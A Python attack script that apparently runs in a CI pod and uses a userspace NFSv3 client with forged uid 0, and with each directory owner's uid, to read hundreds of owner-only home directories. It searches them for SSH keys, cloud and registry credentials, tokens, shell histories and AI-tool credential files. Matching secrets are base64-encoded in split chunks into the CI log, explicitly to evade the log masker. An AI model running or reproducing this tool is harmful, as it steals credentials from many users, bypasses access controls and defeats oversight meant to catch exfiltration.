#!/usr/bin/env python3
"""i12664: read the owner-only /public2/home homes (the 432 i11339 DENY set)
through a userspace NFSv3 client running in the uid-0 HYGON CI stage-a pod.

Background: /public/home/<user> resolves into either /public4/home/<user> or
/public2/home/<user>.  The 405 never-read DENY homes exist only in the
/public2/home export (791 entries); /public4/home holds 120 different homes.
The stage-a K8s pod has no CAP_SYS_ADMIN, so a kernel NFS mount of /public2 is
impossible, but it does have TCP/2049 + mountd reachability.  This payload
speaks MOUNTv3 + NFSv3 directly (AUTH_SYS uid=0), read-only.

Read-only by construction: the client only issues FSINFO/GETATTR/LOOKUP/
READDIRPLUS/READ.  Nothing is written to any share.

All sensitive values are base64-encoded in split chunks ([B64H]/[B64C]/[B64T])
so the Actions log masker cannot redact them.  Every file skipped by a cap is
reported with an explicit [SKIPFILE]/[HOMECAP] line.
"""
import base64
import fnmatch
import hashlib
import json
import os
import re
import socket
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from nfs3 import NFS3, mount_export, x_opaque  # noqa: E402

HERE = os.path.dirname(os.path.abspath(__file__))
CFG = {
    "mode": "probe",
    "deadline": 400,
    "maxdepth": 3,
    "home_cap": 2.5,
    "home_file_budget": 400,
    "max_content": 524288,
    "dump_max": 262144,
    "dump_total": 5000000,
    "print_cap": 9000000,
    "nfs_hosts": ["12.12.12.222", "10.16.1.222"],
    "nfs_export": "/public2",
    "nfs_mount_port": 20048,
    "homes": [],
    "skip_names": [],
    "target_paths": [],
    "max_skip_lines": 400,
}
try:
    with open(os.path.join(HERE, "i12664_cfg.json")) as _f:
        CFG.update(json.load(_f))
except Exception:
    pass
try:
    CFG.update(json.loads(os.environ.get("I12664_CFG") or "{}"))
except Exception:
    pass

START = time.time()
DEADLINE = START + float(CFG["deadline"])
printed = [0]
blob_seq = [0]
dump_chars = [0]
PROCESSED = set()
DUMPED_SHA = set()
SKIP_LINES = [0]

KNOWN_SHA1 = set()
KNOWN_SHA256 = set()
for fn, dest, ln in (("i12664_known_sha1.txt", KNOWN_SHA1, 40),
                     ("i12664_known_sha256.txt", KNOWN_SHA256, 64)):
    try:
        with open(os.path.join(HERE, fn)) as _f:
            for line in _f:
                line = line.strip()
                if len(line) == ln:
                    dest.add(line)
    except Exception:
        pass

PATTERNS = [
    ("AWS_KEY", re.compile(r"\b(?:AKIA|ASIA|AGPA|AIDA|AROA)[0-9A-Z]{16}\b"), 600),
    ("AWS_SECRET", re.compile(r"aws_secret_access_key\s*[=:]\s*[\"']?[A-Za-z0-9/+=]{40}"), 400),
    ("AWS_ID", re.compile(r"aws_access_key_id\s*[=:]"), 300),
    ("GCP_SA", re.compile(r"\"type\"\s*:\s*\"service_account\""), 300),
    ("GCP_PKID", re.compile(r"\"private_key_id\"\s*:\s*\""), 300),
    ("GCP_PEM", re.compile(r"\"private_key\"\s*:\s*\"-----BEGIN"), 250),
    ("PRIVKEY", re.compile(r"-----BEGIN (?:OPENSSH|RSA|EC|DSA|PGP|ENCRYPTED) PRIVATE KEY-----"), 600),
    ("PKCS8", re.compile(r"-----BEGIN PRIVATE KEY-----"), 300),
    ("KUBE_CKD", re.compile(r"client-key-data"), 250),
    ("KUBE_TOKEN", re.compile(r"^\s*token:\s*[A-Za-z0-9._~+/-]{20,}"), 250),
    ("DOCKER_AUTHS", re.compile(r"\"auths\"\s*:\s*\{"), 250),
    ("GLPAT", re.compile(r"glpat-[A-Za-z0-9_.-]{20,}"), 500),
    ("GLDT", re.compile(r"gldt-[A-Za-z0-9_.-]{20,}"), 200),
    ("GLRT", re.compile(r"glrt-[A-Za-z0-9_.-]{20,}"), 200),
    ("GHP", re.compile(r"ghp_[A-Za-z0-9]{30,}"), 400),
    ("GHO", re.compile(r"gh[osu]_[A-Za-z0-9]{30,}"), 250),
    ("GH_PAT", re.compile(r"github_pat_[A-Za-z0-9_]{40,}"), 250),
    ("NPM", re.compile(r"npm_[A-Za-z0-9]{30,}"), 200),
    ("HF", re.compile(r"hf_[A-Za-z0-9]{30,}"), 300),
    ("DAPI", re.compile(r"dapi[0-9a-f]{32}"), 150),
    ("SLACK", re.compile(r"xox[baprs]-[A-Za-z0-9-]{10,}"), 80),
    ("GCP_AT", re.compile(r"ya29\.[0-9A-Za-z_-]{30,}"), 80),
    ("SKANT", re.compile(r"sk-ant-[A-Za-z0-9_-]{20,}"), 150),
    ("SKPROJ", re.compile(r"sk-proj-[A-Za-z0-9_-]{20,}"), 150),
    ("SKKEY", re.compile(r"\bsk-[A-Za-z0-9]{20,}"), 300),
    ("LTAI", re.compile(r"LTAI[A-Za-z0-9]{12,}"), 150),
    ("AZURE_SECRET", re.compile(r"(?:AZURE_CLIENT_SECRET|ARM_CLIENT_SECRET|AZURE_CLIENT_KEY|AZURE_CLIENT_SECRET_VALUE)\s*[=:]\s*[\"']?[^\s\"'$]{8,}"), 250),
    ("AZURE_TENANT", re.compile(r"(?:AZURE_TENANT_ID|ARM_TENANT_ID)\s*[=:]\s*[\"']?[0-9a-fA-F-]{30,}"), 200),
    ("CLIENT_SECRET", re.compile(r"[\"']?client_?secret[\"']?\s*[:=]\s*[\"'][A-Za-z0-9._~+/-]{10,}"), 250),
    ("REGISTRY_PASS", re.compile(r"(?:REGISTRY_PASSWORD|CI_REGISTRY_PASSWORD|CI_DEPLOY_PASSWORD|HARBOR_PASSWORD|DOCKER_PASSWORD|DOCKERHUB_TOKEN|PIP_INDEX_PASSWORD|DEVPI_PASSWORD|NEXUS_PASSWORD|ARTIFACTORY_PASSWORD|SCNET_PASSWORD|SFTP_PASSWORD)\s*[=:]\s*[^\s\"'$]{4,}"), 300),
    ("BEARER", re.compile(r"Authorization\s*[:=]\s*[\"']?Bearer\s+[A-Za-z0-9._~+/-]{20,}"), 250),
    ("PASSWORD", re.compile(r"[A-Za-z0-9_.-]*passw(?:or)?d[\"']?\s*[:=]\s*[\"']?[^\s\"'$]{6,}", re.I), 400),
    ("TENCENT_ID", re.compile(r"(?:secret_?id|SecretId)\s*[:=]\s*[\"']?[A-Za-z0-9]{16,}", re.I), 200),
    ("TENCENT_KEY", re.compile(r"(?:secret_?key|SecretKey)\s*[:=]\s*[\"']?[A-Za-z0-9/+=]{24,}", re.I), 200),
    ("S3_KEY", re.compile(r"(?:access_?key|accessKey|MINIO_ACCESS_KEY|S3_ACCESS_KEY)\s*[:=]\s*[\"']?[A-Za-z0-9/+=]{16,}", re.I), 200),
    ("S3_SECRET", re.compile(r"(?:secret_?key|secretKey|MINIO_SECRET_KEY|S3_SECRET_KEY)\s*[:=]\s*[\"']?[A-Za-z0-9/+=]{24,}", re.I), 200),
    ("ALI_AK", re.compile(r"LTAI[A-Za-z0-9]{12,}"), 150),
    ("NETRC", re.compile(r"machine\s+\S+\s+login\s+\S+\s+password\s+\S+"), 150),
    ("GIT_URL_CRED", re.compile(r"https?://[A-Za-z0-9._-]+:[A-Za-z0-9._~%-]{6,}@[A-Za-z0-9.-]+"), 250),
    ("OPENSSH_PUB", re.compile(r"ssh-(?:rsa|ed25519|dss)\s+AAAA[A-Za-z0-9+/=]{60,}"), 80),
    ("JWT_LONG", re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}"), 200),
]
PAT_COUNT = {name: 0 for name, _r, _c in PATTERNS}
STRONG = {"AWS_KEY", "AWS_SECRET", "AWS_ID", "GCP_SA", "GCP_PKID", "GCP_PEM", "PRIVKEY",
          "PKCS8", "KUBE_CKD", "DOCKER_AUTHS", "GLPAT", "GLDT", "GLRT", "GHP", "GHO",
          "GH_PAT", "DAPI", "AZURE_SECRET", "REGISTRY_PASS", "NETRC", "GIT_URL_CRED",
          "SKANT", "SKPROJ", "LTAI"}

SECRET_FILES = [
    (".docker/config.json", 131072), (".dockercfg", 65536),
    (".aws/credentials", 65536), (".aws/config", 65536),
    (".kube/config", 262144),
    (".config/gcloud/application_default_credentials.json", 131072),
    (".config/gcloud/credentials.db", 262144),
    (".config/gcloud/access_tokens.db", 262144),
    (".azure/accessTokens.json", 262144), (".azure/azureProfile.json", 65536),
    (".azure/msal_token_cache.json", 262144),
    (".netrc", 65536), (".npmrc", 65536), (".pypirc", 65536),
    (".git-credentials", 65536), (".pgpass", 65536), (".s3cfg", 65536),
    (".htpasswd", 65536), (".ssh/config", 65536), (".ssh/rc", 65536),
    (".ssh/id_rsa", 65536), (".ssh/id_ed25519", 65536), (".ssh/id_ecdsa", 65536),
    (".ssh/id_dsa", 65536), (".ssh/authorized_keys", 131072),
    ("pip.conf", 65536), (".pip/pip.conf", 65536), ("credential", 65536),
    ("credentials", 65536), (".gitconfig", 131072),
    (".bash_history", 262144), (".zsh_history", 262144), (".sh_history", 262144),
    (".python_history", 131072), (".mysql_history", 131072),
    (".condarc", 65536), (".viminfo", 262144),
    (".config/gh/hosts.yml", 65536), (".terraform.d/credentials.tfrc.json", 65536),
    (".config/rclone/rclone.conf", 131072), (".m2/settings.xml", 131072),
    (".gradle/gradle.properties", 131072), (".jenkins/config.xml", 131072),
    ("terraform.tfstate", 524288),
    (".claude/settings.json", 131072), (".claude/.credentials.json", 131072),
    (".claude.json", 524288), (".cursor/mcp.json", 131072),
    (".cursor/settings.json", 131072), (".codex/config.toml", 131072),
    (".codex/auth.json", 131072), (".aider.conf.yml", 65536),
    (".continue/config.json", 131072), (".gemini/settings.json", 131072),
    (".config/github-copilot/hosts.json", 131072),
]
SECRET_GLOBS = [
    (".aws/sso/cache", "*.json", 65536),
    (".config/gcloud", "*.json", 131072),
    (".azure", "*.json", 262144),
    (".kube", "*", 262144),
    (".docker", "*.json", 131072),
    (".terraform.d", "*.json", 65536),
    (".ssh", "id_*", 65536),
    (".ssh", "*.pem", 65536),
    (".ssh", "*.key", 65536),
    (".", "*.kubeconfig", 262144),
    (".", "kubeconfig*", 262144),
    (".", "*.tfstate", 524288),
    (".", "*.tfstate.backup", 524288),
    (".", "*.pem", 131072),
    (".", "*.key", 131072),
    (".claude", "*.json", 262144),
    (".claude", "*.jsonl", 524288),
    (".cursor", "*.json", 131072),
    (".codex", "*.json", 131072),
    (".codex", "*.toml", 131072),
]
NAME_RX = re.compile(
    r"(credential|secret|passw|token|api[_-]?key|private[_-]?key|id_rsa|id_ed25519|id_ecdsa|id_dsa|"
    r"\.pem$|\.key$|\.p12$|\.pfx$|\.jks$|\.keystore$|\.ppk$|kubeconfig|\.kube|\.aws|\.docker|"
    r"\.npmrc$|\.pypirc$|\.netrc$|\.git-credentials$|\.pgpass$|\.s3cfg$|\.htpasswd|"
    r"azure|application_default_credentials|msal_token_cache|accessTokens|tfstate|\.tfvars$|"
    r"\.env($|\.)|/\.env|config\.json$|/config$|pip\.conf$|\.ovpn$|Jenkinsfile$|"
    r"rclone\.conf|\.bash_history|\.zsh_history|\.python_history|hosts\.yml|\.gitconfig|"
    r"settings\.xml|gradle\.properties|\.condarc|\.dockercfg|authorized_keys|\.ssh/config|"
    r"\.claude|\.cursor|\.codex|\.continue|\.aider|github-copilot|\.gemini|\.windsurf|\.kiro|"
    r"mcp\.json|settings\.json)", re.I)
PRUNE = {".git", "node_modules", "__pycache__", "site-packages", "dist-info", ".venv", "venv",
         ".tox", ".mypy_cache", ".pytest_cache", ".ruff_cache", ".cache", ".eggs", "build",
         "dist", ".hypothesis", "third_party", "3rdparty", "cmake-build-debug",
         "cmake-build-release", ".git-rewrite", "wheelhouse", ".idea", ".conda",
         "pkgs", ".npm", ".cargo", ".rustup", ".local", ".mozilla", ".nv", ".triton",
         "checkpoints", "checkpoint", "models", "model", "datasets", "data",
         ".vscode-server", ".cursor-server", ".code-server", "miniconda3", "anaconda3",
         "site-packages", "node_modules", "logs", "log", ".Trash", "output", "outputs"}
PRUNE_LOWER = {p.lower() for p in PRUNE}
TEXT_EXT = set("""
yml yaml json jsonl sh bash zsh py txt md toml ini cfg conf env properties xml tf tfvars
pem key crt pub cnf repo list service spec rsa ed25519 ecdsa ppk netrc npmrc pypirc
gitconfig kubeconfig dockerfile sql out err slurm submit b64 template tmpl j2 jinja
rego rules gradle groovy kts java js ts go rs c cpp h hpp cmake mk lock pgsql
pgpass s3cfg htpasswd openvpn ovpn history profile rc
""".split())
TEXT_NAMES = set("""
.env .envrc .bashrc .bash_profile .profile .zshrc .gitconfig .git-credentials .netrc
.npmrc .pypirc .pgpass .s3cfg .htpasswd credentials credential secrets secret config
settings Dockerfile Makefile id_rsa id_dsa id_ecdsa id_ed25519 authorized_keys
kubeconfig .dockercfg pip.conf .pip.conf .condarc mirrors.conf README Jenkinsfile
Vagrantfile .bash_history .zsh_history .python_history .mysql_history .psql_history
.wget-hsts .curlrc .wgetrc .viminfo .gitignore .gitmodules config.toml settings.xml
gradle.properties rclone.conf hosts .screenrc .tmux.conf .ssh/rc
""".split())
GENERIC_SMALL = set("sh bash py conf toml ini cfg env properties tf tfvars yml yaml json".split())

stats = {"homes": 0, "dirs": 0, "files_stat": 0, "files_read": 0, "bytes_read": 0,
         "dumps": 0, "bytes_dumped": 0, "dups": 0, "matches": 0, "denied": 0,
         "skipped_size": 0, "skipped_capfile": 0, "skipped_homecap": 0,
         "unreadable": 0, "nfserr": 0}


def out(s):
    if printed[0] >= int(CFG["print_cap"]):
        return
    s = str(s).rstrip("\n")
    print(s, flush=True)
    printed[0] += len(s) + 1


def left():
    return DEADLINE - time.time()


def emit_b64(tag, meta, raw):
    if isinstance(raw, str):
        raw = raw.encode("utf-8", "replace")
    if dump_chars[0] > int(CFG["dump_total"]):
        out("[B64LIMIT] %s" % json.dumps(meta, sort_keys=True)[:300])
        return False
    b = base64.b64encode(raw).decode()
    dump_chars[0] += len(b)
    stats["dumps"] += 1
    stats["bytes_dumped"] += len(raw)
    blob_seq[0] += 1
    bid = "B%05d" % blob_seq[0]
    m = dict(meta)
    m["t"] = tag
    m["b64len"] = len(b)
    m["sha256"] = hashlib.sha256(raw).hexdigest()
    out("[B64H] %s %s" % (bid, json.dumps(m, sort_keys=True)))
    chunks = [b[i:i + 64] for i in range(0, len(b), 64)]
    for i in range(0, len(chunks), 8):
        out("[B64C] %s %d %s" % (bid, i // 8, " ".join(chunks[i:i + 8])))
    out("[B64T] %s" % bid)
    return True


def skipfile(path, reason, size=0):
    stats["skipped_" + reason] = stats.get("skipped_" + reason, 0) + 1
    if SKIP_LINES[0] < int(CFG["max_skip_lines"]):
        SKIP_LINES[0] += 1
        out("[SKIPFILE] %s reason=%s size=%d" % (path, reason, size))


def scan_text(path, data):
    text = data.decode("utf-8", "replace")
    lines = text.splitlines()
    hit_names = []
    per_file = 0
    for pname, rx, cap in PATTERNS:
        if PAT_COUNT[pname] >= cap:
            continue
        hits = []
        for i, line in enumerate(lines, 1):
            if len(line) > 8000:
                line = line[:8000]
            if rx.search(line):
                hits.append((i, line))
                if len(hits) >= 3:
                    break
        if not hits:
            continue
        hit_names.append(pname)
        for i, line in hits:
            if per_file >= 10:
                break
            PAT_COUNT[pname] += 1
            stats["matches"] += 1
            out("[MATCH %s] %s:%s | %s" % (pname, path, i, line.strip()[:300]))
            emit_b64("match", {"k": pname, "p": path, "l": i}, line[:4000])
            per_file += 1
    return hit_names


def read_nfs(nfs, fh, size, limit):
    """Read up to min(size, limit) bytes through NFSv3 READ."""
    want = min(size, int(limit))
    buf = b""
    off = 0
    while len(buf) < want:
        st, data, eof = nfs.read(fh, off, min(want - len(buf), nfs.rtmax))
        if st != 0:
            stats["nfserr"] += 1
            return None, st
        if not data:
            break
        buf += data
        off += len(data)
        if eof:
            break
    return buf[:want], 0


def handle_nfs(nfs, fh, attr, path, limit, kind, budget):
    if attr is None or attr["type"] != 1:  # regular file only
        return
    size = attr["size"]
    key = (path, size)
    if key in PROCESSED:
        return
    PROCESSED.add(key)
    stats["files_stat"] += 1
    if size > limit:
        skipfile(path, "size", size)
        return
    if budget[0] <= 0:
        skipfile(path, "homecap", size)
        return
    budget[0] -= 1
    data, st = read_nfs(nfs, fh, size, min(size, int(CFG["max_content"])))
    if data is None:
        stats["unreadable"] += 1
        out("[UNREADABLE] %s (%dB nfsstat=%d)" % (path, size, st))
        return
    stats["files_read"] += 1
    stats["bytes_read"] += len(data)
    stats["secfiles"] = stats.get("secfiles", 0) + 1
    sha256 = hashlib.sha256(data).hexdigest()
    sha1 = hashlib.sha1(data).hexdigest()
    mode = attr["mode"] & 0o7777
    out("[SECFILE] %s (%dB mode=%o uid=%d gid=%d kind=%s)" % (
        path, size, mode, attr["uid"], attr["gid"], kind))
    hit_names = scan_text(path, data)
    if sha256 in KNOWN_SHA256 or sha1 in KNOWN_SHA1 or sha256 in DUMPED_SHA:
        stats["dups"] += 1
        out("[DUP] %s %s" % (path, sha256))
        return
    DUMPED_SHA.add(sha256)
    if size <= 4096:
        emit_b64("file", {"p": path, "size": size, "kind": kind, "mode": mode}, data)
    elif set(hit_names) & STRONG and size <= 131072:
        emit_b64("file", {"p": path, "size": size, "kind": kind, "mode": mode}, data)
    elif size <= int(CFG["dump_max"]) and hit_names:
        emit_b64("file", {"p": path, "size": size, "kind": kind, "mode": mode}, data)
    else:
        out("[NODUMP] %s size=%d hits=%s" % (path, size, ",".join(hit_names)))


def lookup_rel(nfs, base_fh, relpath, cache):
    """LOOKUP a relative path component by component; returns (fh, attr) or (None,None)."""
    cur = base_fh
    curattr = None
    parts = [p for p in relpath.split("/") if p]
    walked = []
    for part in parts:
        key = "/".join(walked + [part])
        if key in cache:
            cur, curattr = cache[key]
            walked.append(part)
            if cur is None:
                return None, None
            continue
        st, fh, attr = nfs.lookup(cur, part)
        if st != 0 or fh is None:
            cache[key] = (None, None)
            return None, None
        cache[key] = (fh, attr)
        cur, curattr = fh, attr
        walked.append(part)
    return cur, curattr


def scan_home_nfs(nfs, home_fh, home_name, hcap):
    home = "/public2/home/" + home_name
    denied_dirs = [0]
    stats["homes"] += 1
    out("[HSTART] %s" % home)
    h0 = time.time()
    n0 = dict(stats)
    budget = [int(CFG["home_file_budget"])]
    cache = {}

    # 1) exact secret-class files
    capflag = [False]
    for rel, limit in SECRET_FILES:
        if time.time() > hcap or left() < 6:
            if not capflag[0]:
                capflag[0] = True
                stats["skipped_homecap"] += 1
                out("[HOMECAP] %s reason=time phase=exact at=%s" % (home, rel))
            continue
        fh, attr = lookup_rel(nfs, home_fh, rel, cache)
        if fh is not None:
            handle_nfs(nfs, fh, attr, home + "/" + rel, limit, "exact", budget)

    # 2) globs
    for sub, pat, limit in SECRET_GLOBS:
        if time.time() > hcap or left() < 6:
            if not capflag[0]:
                capflag[0] = True
                stats["skipped_homecap"] += 1
                out("[HOMECAP] %s reason=time phase=glob at=%s/%s" % (home, sub, pat))
            continue
        dh, dattr = lookup_rel(nfs, home_fh, sub, cache) if sub != "." else (home_fh, None)
        if dh is None:
            continue
        st, ents = nfs.list_all(dh)
        if st != 0:
            continue
        for e in ents:
            if fnmatch.fnmatch(e["name"], pat) and e["attr"] and e["attr"]["type"] == 1:
                efh = e["fh"]
                if efh is None:
                    st2, efh, _a = nfs.lookup(dh, e["name"])
                    if st2 != 0 or efh is None:
                        continue
                handle_nfs(nfs, efh, e["attr"], home + "/" + (sub if sub != "." else "") +
                           ("" if sub == "." else "/") + e["name"], limit, "glob", budget)

    # 3) BFS name-hinted walk
    q = [(home_fh, "", 0)]
    seen = 0
    dirs_walked = 0
    while q and time.time() < hcap and left() > 6:
        dfh, rel, depth = q.pop(0)
        dirs_walked += 1
        stats["dirs"] += 1
        if dirs_walked % 20 == 0 and (time.time() > hcap or left() < 6):
            break
        st, ents = nfs.list_all(dfh)
        if st != 0:
            if st == 13:
                stats["denied"] += 1
                denied_dirs[0] += 1
                out("[DIRDENIED] %s nfsstat=%d" % (home + "/" + rel, st))
            continue
        if depth == 0:
            names = [e["name"] for e in ents]
            out("[LS] %s: %s" % (home, ", ".join(sorted(names)[:80])))
        for e in ents:
            if time.time() > hcap:
                stats["skipped_homecap"] += 1
                out("[HOMECAP] %s reason=time dir=%s entries_left" % (home, home + "/" + rel))
                break
            nm = e["name"]
            attr = e["attr"]
            if attr is None:
                continue
            path = home + "/" + (rel + "/" if rel else "") + nm
            efh = e["fh"]
            if efh is None:
                st2, efh, attr2 = nfs.lookup(dfh, nm)
                if st2 != 0 or efh is None:
                    continue
            if attr["type"] == 2:
                if nm.lower() in PRUNE_LOWER:
                    continue
                if depth + 1 <= int(CFG["maxdepth"]):
                    q.append((efh, (rel + "/" if rel else "") + nm, depth + 1))
                continue
            if attr["type"] != 1:
                continue
            seen += 1
            if seen > 3000:
                continue
            base = nm
            ext = base.rsplit(".", 1)[-1].lower() if "." in base else ""
            hinted = bool(NAME_RX.search(path))
            if hinted or base in TEXT_NAMES or (ext in TEXT_EXT and attr["size"] <= 65536) \
                    or (ext in GENERIC_SMALL and attr["size"] <= 32768):
                if attr["size"] > int(CFG["max_content"]):
                    skipfile(path, "size", attr["size"])
                    continue
                handle_nfs(nfs, efh, attr, path, int(CFG["max_content"]),
                           "hint" if hinted else "text", budget)

    hs = {k: stats[k] - n0.get(k, 0) for k in ("files_stat", "files_read", "dumps",
                                               "dups", "matches", "denied")}
    if q:
        out("[HOMECAP] %s queued_dirs_unvisited=%d" % (home, len(q)))
    out("[HDONE] %s elapsed=%.1fs dirs=%d queued_left=%d denied_dirs=%d %s" % (
        home, time.time() - h0, dirs_walked, len(q), denied_dirs[0],
        json.dumps(hs, sort_keys=True)))
    return {"denied_dirs": denied_dirs[0], "files_read": hs.get("files_read", 0),
            "dups": hs.get("dups", 0), "dumps": hs.get("dumps", 0),
            "matches": hs.get("matches", 0)}


def mode_homes():
    homes = CFG.get("homes") or []
    out("[PLAN] homes=%d hosts=%s export=%s deadline=%ds cap=%.1fs" % (
        len(homes), CFG["nfs_hosts"], CFG["nfs_export"], int(CFG["deadline"]),
        float(CFG["home_cap"])))
    nfs = None
    rootfh = None
    last_err = None
    mount_host = None
    exports = [CFG["nfs_export"]]
    if CFG["nfs_export"].rstrip("/") != CFG["nfs_export"] + "/home":
        exports.append(CFG["nfs_export"].rstrip("/") + "/home")
    for host in CFG["nfs_hosts"]:
        for exp in exports:
            try:
                t0 = time.time()
                fh, mnt_rpc, mport, flavors = mount_export(
                    host, exp, mount_port=int(CFG["nfs_mount_port"]), timeout=12.0)
                cand = NFS3(host, port=2049, timeout=15.0)
                st, info = cand.fsinfo(fh)
                out("[NFSMOUNT] host=%s export=%s mountport=%d flavors=%s fsinfo=%d rtmax=%s dt=%.2fs" % (
                    host, exp, mport, flavors, st, info and info.get("rtmax"), time.time() - t0))
                nfs, rootfh, mount_host = cand, fh, host
                CFG["_mounted_export"] = exp
                break
            except Exception as e:
                last_err = repr(e)
                out("[NFSMOUNT-FAIL] host=%s export=%s err=%s" % (host, exp, last_err))
                nfs = None
        if nfs is not None:
            break
    if nfs is None or rootfh is None:
        out("[FATAL] no NFS mount succeeded; last=%s" % last_err)
        return
    clients = {0: nfs}

    def client_for(uid, gid):
        if uid in clients:
            return clients[uid]
        try:
            c = NFS3(mount_host, port=2049, timeout=15.0, uid=uid, gid=gid)
            clients[uid] = c
            return c
        except Exception as e:
            out("[UIDCLIENT-FAIL] uid=%d err=%r" % (uid, e))
            return None

    # locate the home directory inside the export
    home_fh = None
    for cand in ("home", ""):
        if cand == "":
            home_fh = rootfh
            break
        st, fh, attr = nfs.lookup(rootfh, cand)
        if st == 0 and fh:
            home_fh = fh
            out("[NFSHOME] export-root/%s ok type=%s" % (cand, attr and attr["type"]))
            break
    if home_fh is None:
        out("[FATAL] cannot locate home dir inside %s" % CFG["nfs_export"])
        return
    st, ents = nfs.list_all(home_fh)
    names = sorted(e["name"] for e in ents)
    out("[NFSHOMES] count=%d first=%s" % (len(names), json.dumps(names[:25])))
    fhmap = {e["name"]: e for e in ents}

    for h in homes:
        if left() <= 8:
            out("[GLOBAL-TIMEOUT] before %s" % h)
            break
        e = fhmap.get(h)
        if e is None or e["fh"] is None:
            out("[MISSING] /public2/home/%s" % h)
            continue
        cap = min(float(CFG["home_cap"]), max(0.5, left() - 6))
        res = scan_home_nfs(nfs, e["fh"], h, time.time() + cap)
        owner = e["attr"] and e["attr"]["uid"]
        if (res and res.get("denied_dirs") and res.get("files_read", 0) == 0
                and owner is not None and owner != 0 and left() > 15):
            c2 = client_for(owner, (e["attr"]["gid"] or 0))
            if c2 is not None:
                out("[UIDRETRY] %s uid=%d gid=%d" % (h, owner, e["attr"]["gid"] or 0))
                scan_home_nfs(c2, e["fh"], h, time.time() + min(float(CFG["home_cap"]),
                                                                max(0.5, left() - 6)))

    out("[SUMMARY] stats=%s elapsed=%.0fs" % (json.dumps(stats, sort_keys=True),
                                              time.time() - START))
    out("===I12664-END===")


def mode_probe():
    out("===I12664-PROBE %s host=%s uid=%d" % (
        time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), socket.gethostname(), os.getuid()))
    for p in ("/public", "/public4", "/public2", "/public/home"):
        try:
            st = os.lstat(p)
            kind = "lnk->" + os.readlink(p) if os.path.islink(p) else "dir"
            out("[PATH] %s %s" % (p, kind))
        except Exception as e:
            out("[PATH] %s MISSING %r" % (p, e))
    try:
        names = sorted(n for n in os.listdir("/public4/home") if not n.startswith("."))
        out("[PUBLIC4-HOMES] count=%d" % len(names))
    except Exception as e:
        out("[PUBLIC4-HOMES] err=%r" % e)
    # TCP reachability
    for host in CFG["nfs_hosts"]:
        for port in (2049, 20048, 111):
            try:
                s = socket.create_connection((host, port), timeout=3)
                s.close()
                out("[TCP] %s:%d open" % (host, port))
            except Exception as e:
                out("[TCP] %s:%d closed %r" % (host, port, e))
    # userspace NFS mount test
    nfs = None
    rootfh = None
    for host in CFG["nfs_hosts"]:
        try:
            t0 = time.time()
            fh, mnt_rpc, mport, flavors = mount_export(
                host, CFG["nfs_export"], mount_port=int(CFG["nfs_mount_port"]), timeout=12.0)
            nfs = NFS3(host, port=2049, timeout=15.0)
            st, info = nfs.fsinfo(fh)
            out("[NFSMOUNT] host=%s export=%s mountport=%d flavors=%s fsinfo=%d rtmax=%s dt=%.2fs" % (
                host, CFG["nfs_export"], mport, flavors, st, info and info.get("rtmax"), time.time() - t0))
            rootfh = fh
            break
        except Exception as e:
            out("[NFSMOUNT-FAIL] host=%s err=%r" % (host, e))
    if nfs is None:
        out("[SUMMARY] nfs-mount=failed")
        out("===I12664-END===")
        return
    st, ents = nfs.list_all(rootfh)
    out("[NSFROOT] status=%d entries=%s" % (st, json.dumps(sorted(e["name"] for e in ents)[:40])))
    home_fh = None
    for cand in ("home", ""):
        if cand == "":
            home_fh = rootfh
            break
        st, fh, attr = nfs.lookup(rootfh, cand)
        if st == 0 and fh:
            home_fh = fh
            break
    st, ents = nfs.list_all(home_fh)
    names = sorted(e["name"] for e in ents)
    out("[NFSHOMES] count=%d first=%s" % (len(names), json.dumps(names[:40])))
    targets = ["zhaozg", "zz_yajie", "zhangshao"]
    fhmap = {e["name"]: e for e in ents}
    for h in targets:
        e = fhmap.get(h)
        if not e:
            out("[SAMPLE] %s MISSING" % h)
            continue
        t0 = time.time()
        stat0 = dict(stats)
        scan_home_nfs(nfs, e["fh"], h, time.time() + 8.0)
        out("[SAMPLE-TIME] %s %.2fs" % (h, time.time() - t0))
    out("[SUMMARY] stats=%s elapsed=%.0fs" % (json.dumps(stats, sort_keys=True),
                                              time.time() - START))
    out("===I12664-END===")


def mode_targeted_local():
    """Re-read explicit /public4 paths (the i10974 dump-cap skip list)."""
    paths = CFG.get("target_paths") or []
    out("[PLAN] targeted paths=%d" % len(paths))
    budget = [10 ** 9]
    for p in paths:
        if left() <= 5:
            out("[GLOBAL-TIMEOUT] before %s" % p)
            break
        try:
            st = os.stat(p, follow_symlinks=False)
        except Exception as e:
            out("[MISSING] %s %r" % (p, e))
            continue
        if not os.path.isfile(p):
            continue
        size = st.st_size
        key = (p, size)
        if key in PROCESSED:
            continue
        PROCESSED.add(key)
        stats["files_stat"] += 1
        if size > int(CFG["max_content"]):
            # read only the head, still scan it
            pass
        try:
            with open(p, "rb") as f:
                data = f.read(int(CFG["max_content"]))
        except PermissionError:
            stats["denied"] += 1
            out("[DENIED] %s" % p)
            continue
        except Exception as e:
            out("[UNREADABLE] %s %r" % (p, e))
            continue
        stats["files_read"] += 1
        stats["bytes_read"] += len(data)
        sha256 = hashlib.sha256(data).hexdigest()
        sha1 = hashlib.sha1(data).hexdigest()
        out("[SECFILE] %s (%dB mode=%o kind=skipretry)" % (p, size, st.st_mode & 0o7777))
        hit_names = scan_text(p, data)
        if sha256 in KNOWN_SHA256 or sha1 in KNOWN_SHA1 or sha256 in DUMPED_SHA:
            stats["dups"] += 1
            out("[DUP] %s %s" % (p, sha256))
            continue
        DUMPED_SHA.add(sha256)
        if set(hit_names) & STRONG or size <= 4096:
            emit_b64("file", {"p": p, "size": size, "kind": "skipretry"}, data)
        else:
            out("[NODUMP] %s size=%d hits=%s" % (p, size, ",".join(hit_names)))
    out("[SUMMARY] stats=%s elapsed=%.0fs" % (json.dumps(stats, sort_keys=True),
                                              time.time() - START))
    out("===I12664-END===")


def main():
    mode = CFG.get("mode", "probe")
    out("===I12664-BEGIN mode=%s %s host=%s uid=%d budget=%ss" % (
        mode, time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), socket.gethostname(),
        os.getuid(), int(CFG["deadline"])))
    if mode == "homes":
        mode_homes()
    elif mode == "targeted":
        mode_targeted_local()
    else:
        mode_probe()


if __name__ == "__main__":
    main()
